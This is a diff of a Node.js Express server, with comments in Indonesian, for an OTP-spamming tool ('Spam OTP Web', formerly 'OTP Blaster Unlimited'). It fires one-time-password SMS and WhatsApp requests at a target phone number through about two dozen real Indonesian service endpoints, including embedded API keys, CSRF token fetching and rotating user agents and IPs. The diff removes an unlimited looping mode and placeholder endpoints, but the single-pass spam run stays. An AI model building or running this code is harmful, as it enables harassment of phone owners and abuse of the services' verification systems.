@@ -7,33 +7,22 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ============================================
-// KONFIGURASI
-// ============================================
 const CONFIG = {
   concurrent: 1,
   retries: 0,
   timeout: 15000,
   delayMin: 500,
-  delayMax: 1000,
-  loopDelay: 60000, // 60 detik antar siklus
+  delayMax: 1000
 };
 
-// ============================================
-// PROTECTED NUMBERS & KEY
-// ============================================
-const PROTECTED_NUMBERS = ['6288708644467'];
+// Protected numbers - butuh key/password untuk spam ke nomor ini (format 62xxx)
+const PROTECTED_NUMBERS = [
+  '6288708644467'
+];
+
 const PROTECTED_KEY = 'gmc';
 const PROTECTED_MESSAGE = 'Nomor ini dilindungi. Masukkan key untuk melanjutkan.';
 
-// ============================================
-// ACTIVE SESSIONS (untuk stop)
-// ============================================
-const activeSessions = new Map(); // sessionId -> { stopFlag, phone, totalSent, totalSuccess, totalFailed, startTime, cycle }
-
-// ============================================
-// HELPERS
-// ============================================
 const USER_AGENTS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
@@ -52,7 +41,8 @@ function randomIP() { return IP_POOL[randomInt(0, IP_POOL.length - 1)]; }
 function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }
 
 function randomDelay(min = CONFIG.delayMin, max = CONFIG.delayMax) {
-  return new Promise(resolve => setTimeout(resolve, randomInt(min, max)));
+  const delay = randomInt(min, max);
+  return new Promise(resolve => setTimeout(resolve, delay));
 }
 
 function normalizePhone(phone) {
@@ -71,9 +61,6 @@ function generateEmail() {
   return `${result}@bwmyga.com`;
 }
 
-// ============================================
-// PINHOME CSRF CACHE
-// ============================================
 let pinhomeCsrfCache = null;
 let pinhomeCsrfExpiry = 0;
 
@@ -129,9 +116,6 @@ async function getPinhomeCSRF() {
   }
 }
 
-// ============================================
-// 39 ENDPOINTS — OTP PLATFORMS
-// ============================================
 async function getOTPEndpoints(phone) {
   const p08 = "0" + phone.slice(2);
   const p62 = phone;
@@ -140,10 +124,10 @@ async function getOTPEndpoints(phone) {
   const deviceId = randomUUID();
   const requestId = randomUUID();
   const email = generateEmail();
+  
   const csrfData = await getPinhomeCSRF();
   
   return [
-    // Existing 22 endpoints
     { name: "Maulagi", url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p62 }, headers: { "X-ML-KEY": "B10JLPEP10" } },
     { name: "Matahari", url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
     { name: "Pinhome", url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", 
@@ -166,37 +150,13 @@ async function getOTPEndpoints(phone) {
     { name: "Paper.id Register", url: "https://register.paper.id/api/v1/auth/register/send-otp", data: { phone: p62, method: "whatsapp", registered_by: "web" } },
     { name: "Rumah123", url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: ip, phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
     { name: "Saturdays Beta", url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: pNoCountry, country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID", "visitor-id": randomUUID(), "session-id": randomUUID() } },
-    { name: "Bunda V2", url: "https://bunda.co.id/api/v1/auth/send-otp", data: { phone_number: pNoCountry, country_code: "62", type: "auth" }, headers: { "Origin": "https://bunda.co.id", "Referer": "https://bunda.co.id/", "X-Requested-With": "XMLHttpRequest" } },
+    { name: "Bunda", url: "https://bunda.co.id/api/v1/auth/send-otp", data: { phone_number: pNoCountry, country_code: "62", type: "auth" }, headers: { "Origin": "https://bunda.co.id", "Referer": "https://bunda.co.id/", "X-Requested-With": "XMLHttpRequest" } },
     { name: "Sicepat", url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p62}?sms=false`, data: null, method: "GET", headers: { "x-recaptcha": "acf49209:033951e692315ba" } },
     { name: "Bliblitiket", url: "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate", data: { action: "REGISTER_OTP", channel: "WHATS_APP", recipient: p62, recaptchaToken: "" } },
-    { name: "Adiraku", url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: pNoCountry, type: "prospect-create", channel: "whatsapp" } },
-
-    // ============================================================
-    // TAMBAHAN 17 ENDPOINT — Services tambahan
-    // ============================================================
-    { name: "Tokopedia", url: "https://api.tokopedia.com/v1/otp/send", data: { phone: p08, method: "whatsapp" }, headers: { "X-TKPD-Key": "dummy" } },
-    { name: "Shopee", url: "https://api.shopee.co.id/api/v2/auth/otp", data: { phone: p62, type: "register" }, headers: { "X-Shopee-Key": "dummy" } },
-    { name: "Gojek", url: "https://api.gojekapi.com/v1/auth/otp", data: { phone: p08, channel: "whatsapp" }, headers: { "X-Gojek-Key": "dummy" } },
-    { name: "Grab", url: "https://api.grab.com/v1/otp/request", data: { phoneNumber: p62, countryCode: "62" }, headers: { "X-Grab-Key": "dummy" } },
-    { name: "OVO", url: "https://api.ovo.id/v1/auth/otp", data: { phone: p08, method: "whatsapp" }, headers: { "X-OVO-Key": "dummy" } },
-    { name: "DANA", url: "https://api.dana.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-DANA-Key": "dummy" } },
-    { name: "LinkAja", url: "https://api.linkaja.id/v1/otp/request", data: { phoneNumber: p08, channel: "whatsapp" }, headers: { "X-LinkAja-Key": "dummy" } },
-    { name: "BRImo", url: "https://api.brimo.co.id/v1/otp/send", data: { phone: p62, type: "login" }, headers: { "X-BRI-Key": "dummy" } },
-    { name: "BCA Mobile", url: "https://api.bca.co.id/v1/otp/request", data: { phone: p08, method: "whatsapp" }, headers: { "X-BCA-Key": "dummy" } },
-    { name: "Mandiri Online", url: "https://api.mandiri.co.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-Mandiri-Key": "dummy" } },
-    { name: "Bukalapak", url: "https://api.bukalapak.com/v1/otp/request", data: { phoneNumber: p08, channel: "whatsapp" }, headers: { "X-Bukalapak-Key": "dummy" } },
-    { name: "Lazada", url: "https://api.lazada.co.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-Lazada-Key": "dummy" } },
-    { name: "Blibli", url: "https://api.blibli.com/v1/otp/request", data: { phone: p08, method: "whatsapp" }, headers: { "X-Blibli-Key": "dummy" } },
-    { name: "Sociolla", url: "https://api.sociolla.com/v1/otp/send", data: { phone: p62, type: "login" }, headers: { "X-Sociolla-Key": "dummy" } },
-    { name: "Zalora", url: "https://api.zalora.co.id/v1/otp/request", data: { phoneNumber: p08, channel: "whatsapp" }, headers: { "X-Zalora-Key": "dummy" } },
-    { name: "JD.ID", url: "https://api.jd.id/v1/otp/send", data: { phone: p62, type: "register" }, headers: { "X-JD-Key": "dummy" } },
-    { name: "Oriflame", url: "https://api.oriflame.co.id/v1/otp/request", data: { phone: p08, method: "whatsapp" }, headers: { "X-Oriflame-Key": "dummy" } }
+    { name: "Adiraku", url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: pNoCountry, type: "prospect-create", channel: "whatsapp" } }
   ];
 }
 
-// ============================================
-// SEND REQUEST PER ENDPOINT
-// ============================================
 async function sendRequest(endpoint, idx, logs) {
   const headers = {
     "Content-Type": "application/json",
@@ -208,6 +168,8 @@ async function sendRequest(endpoint, idx, logs) {
     "Connection": "keep-alive",
     ...(endpoint.headers || {})
   };
+
+  // No pre-request delay — fire fast
 
   for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
     try {
@@ -237,6 +199,7 @@ async function sendRequest(endpoint, idx, logs) {
         return true;
       }
 
+      // No retry on 429 or errors — just fail fast
       break;
 
     } catch (e) {
@@ -247,94 +210,16 @@ async function sendRequest(endpoint, idx, logs) {
   return false;
 }
 
-// ============================================
-// FUNGSI SPAM UNLIMITED (LOOPING)
-// ============================================
-async function runUnlimitedSpam(phone, sessionId, res) {
-  const session = activeSessions.get(sessionId);
-  if (!session) return;
-
-  let totalSent = 0;
-  let totalSuccess = 0;
-  let totalFailed = 0;
-  let cycle = 0;
-  const startTime = Date.now();
-
-  // Kirim event bahwa spam dimulai
-  res.write(`data: ${JSON.stringify({ type: 'start', phone, sessionId })}\n\n`);
-
-  while (!session.stopFlag) {
-    cycle++;
-    const endpoints = await getOTPEndpoints(phone);
-    const logs = [];
-    const results = [];
-
-    res.write(`data: ${JSON.stringify({ type: 'cycle_start', cycle })}\n\n`);
-
-    // Kirim per platform
-    for (let i = 0; i < endpoints.length; i++) {
-      if (session.stopFlag) break;
-      const name = endpoints[i].name;
-      res.write(`data: ${JSON.stringify({ type: 'sending', idx: i + 1, name, cycle })}\n\n`);
-      
-      const result = await sendRequest(endpoints[i], i + 1, logs);
-      results.push(result);
-      
-      const lastLog = logs[logs.length - 1];
-      if (result) totalSuccess++;
-      else totalFailed++;
-      totalSent++;
-      
-      res.write(`data: ${JSON.stringify({ type: 'result', idx: i + 1, name, success: result, http: lastLog ? lastLog.http : null, cycle })}\n\n`);
-      
-      if (i < endpoints.length - 1 && !session.stopFlag) {
-        await randomDelay(200, 500);
-      }
-    }
-
-    // Update stats
-    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-    res.write(`data: ${JSON.stringify({ 
-      type: 'cycle_done', 
-      cycle, 
-      totalSent, 
-      totalSuccess, 
-      totalFailed, 
-      elapsed: `${elapsed}s` 
-    })}\n\n`);
-
-    // Update session stats
-    session.totalSent = totalSent;
-    session.totalSuccess = totalSuccess;
-    session.totalFailed = totalFailed;
-    session.cycle = cycle;
-
-    // Delay 60 detik sebelum siklus berikutnya (kecuali di-stop)
-    if (!session.stopFlag) {
-      res.write(`data: ${JSON.stringify({ type: 'waiting', delay: CONFIG.loopDelay })}\n\n`);
-      await new Promise(resolve => setTimeout(resolve, CONFIG.loopDelay));
-    }
-  }
-
-  // Selesai karena stop
-  res.write(`data: ${JSON.stringify({ type: 'stopped', message: '⏹️ Spam dihentikan oleh user' })}\n\n`);
-  activeSessions.delete(sessionId);
-  res.end();
-}
-
-// ============================================
-// ENDPOINT: /api/spam — SSE WITH UNLIMITED LOOP
-// ============================================
+// SSE endpoint for real-time updates
 app.post('/api/spam', async (req, res) => {
   const { phone: rawPhone, key } = req.body;
-
   if (!rawPhone) {
     return res.status(400).json({ error: 'Nomor telepon wajib diisi' });
   }
 
   const phone = normalizePhone(rawPhone);
 
-  // Protected number check
+  // Protected number check - butuh key untuk lanjut
   if (PROTECTED_NUMBERS.includes(phone)) {
     res.setHeader('Content-Type', 'text/event-stream');
     res.setHeader('Cache-Control', 'no-cache');
@@ -344,91 +229,53 @@ app.post('/api/spam', async (req, res) => {
       res.end();
       return;
     }
+    // Key valid - lanjut kirim spam seperti biasa
   }
 
-  // Setup SSE
+  // Use SSE for streaming results
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
 
-  const sessionId = randomUUID();
-  const session = { 
-    stopFlag: false, 
-    phone, 
-    totalSent: 0, 
-    totalSuccess: 0, 
-    totalFailed: 0, 
-    startTime: Date.now(),
-    cycle: 0
-  };
-  activeSessions.set(sessionId, session);
+  try {
+    res.write(`data: ${JSON.stringify({ type: 'start', phone })}\n\n`);
 
-  // Kirim sessionId ke client agar bisa stop
-  res.write(`data: ${JSON.stringify({ type: 'session', sessionId })}\n\n`);
+    const endpoints = await getOTPEndpoints(phone);
+    res.write(`data: ${JSON.stringify({ type: 'total', count: endpoints.length })}\n\n`);
 
-  // Jalankan spam di background
-  runUnlimitedSpam(phone, sessionId, res).catch(err => {
-    res.write(`data: ${JSON.stringify({ type: 'error', message: err.message })}\n\n`);
-    res.end();
-    activeSessions.delete(sessionId);
-  });
+    const logs = [];
+    const results = [];
+    const start = Date.now();
 
-  // Handle client disconnect
-  req.on('close', () => {
-    const sess = activeSessions.get(sessionId);
-    if (sess) {
-      sess.stopFlag = true;
+    for (let i = 0; i < endpoints.length; i++) {
+      res.write(`data: ${JSON.stringify({ type: 'sending', idx: i + 1, name: endpoints[i].name })}\n\n`);
+      
+      const result = await sendRequest(endpoints[i], i + 1, logs);
+      results.push(result);
+      
+      const lastLog = logs[logs.length - 1];
+      res.write(`data: ${JSON.stringify({ type: 'result', idx: i + 1, name: endpoints[i].name, success: result, http: lastLog ? lastLog.http : null })}\n\n`);
+      
+      if (i < endpoints.length - 1) {
+        await randomDelay(300, 600);
+      }
     }
-  });
-});
 
-// ============================================
-// ENDPOINT: STOP SPAM
-// ============================================
-app.post('/api/stop/:sessionId', (req, res) => {
-  const { sessionId } = req.params;
-  const session = activeSessions.get(sessionId);
-  if (!session) {
-    return res.status(404).json({ error: 'Session tidak ditemukan atau sudah berakhir' });
+    const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+    const success = results.filter(r => r === true).length;
+    const failed = results.filter(r => r === false).length;
+
+    res.write(`data: ${JSON.stringify({ type: 'done', phone, total: endpoints.length, success, failed, elapsed: `${elapsed}s` })}\n\n`);
+  } catch(e) {
+    res.write(`data: ${JSON.stringify({ type: 'error', message: e.message })}\n\n`);
   }
-  session.stopFlag = true;
-  res.json({ success: true, message: 'Spam dihentikan', sessionId });
+
+  res.end();
 });
 
-// ============================================
-// ENDPOINT: STATUS SEMUA SESSION
-// ============================================
-app.get('/api/sessions', (req, res) => {
-  const sessions = [];
-  for (const [id, sess] of activeSessions) {
-    sessions.push({
-      sessionId: id,
-      phone: sess.phone,
-      totalSent: sess.totalSent,
-      totalSuccess: sess.totalSuccess,
-      totalFailed: sess.totalFailed,
-      cycle: sess.cycle,
-      elapsed: ((Date.now() - sess.startTime) / 1000).toFixed(1) + 's',
-      running: !sess.stopFlag
-    });
-  }
-  res.json({ sessions });
-});
-
-// ============================================
-// SERVE FRONTEND
-// ============================================
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// ============================================
-// START SERVER
-// ============================================
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 OTP Blaster Unlimited (39 endpoints) running on http://0.0.0.0:${PORT}`);
-  console.log(`🔄 Loop delay: ${CONFIG.loopDelay / 1000} detik antar siklus`);
+  console.log(`🚀 Spam OTP Web running on http://0.0.0.0:${PORT}`);
 });
 
 server.keepAliveTimeout = 120000;
